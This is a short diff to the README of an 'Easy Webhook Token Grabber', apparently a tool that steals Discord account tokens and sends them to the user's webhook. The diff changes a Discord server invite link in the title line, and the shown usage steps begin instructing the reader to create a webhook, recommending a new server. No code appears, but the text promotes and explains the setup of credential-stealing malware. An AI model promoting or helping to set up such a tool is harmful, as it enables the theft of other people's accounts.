@@ -1,4 +1,4 @@
-Easy Webhook Token Grabber, Made By @††#7777 | discord.gg/raided
+Easy Webhook Token Grabber, Made By @††#7777 | https://discord.gg/raided
 
 # How to use
  1. Create a webhook on your Discord server. I recommend creating a new server.
